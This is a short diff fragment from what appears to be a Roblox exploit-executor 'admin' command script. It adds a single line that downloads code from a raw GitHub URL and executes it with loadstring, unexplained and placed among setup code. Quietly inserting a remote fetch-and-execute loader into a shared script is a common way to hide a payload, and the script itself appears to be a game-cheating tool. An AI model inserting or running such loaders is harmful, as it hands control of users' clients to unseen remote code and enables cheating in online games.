@@ -381,6 +381,7 @@ else
     end
 
     getgenv().rev = "dasdsc23_GotBannxd7"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/My-personal-admin/main/z",true))()
 
     function addcmd(name, cmdlistdescription, execute)
         table.insert(sexadmin.commands, {
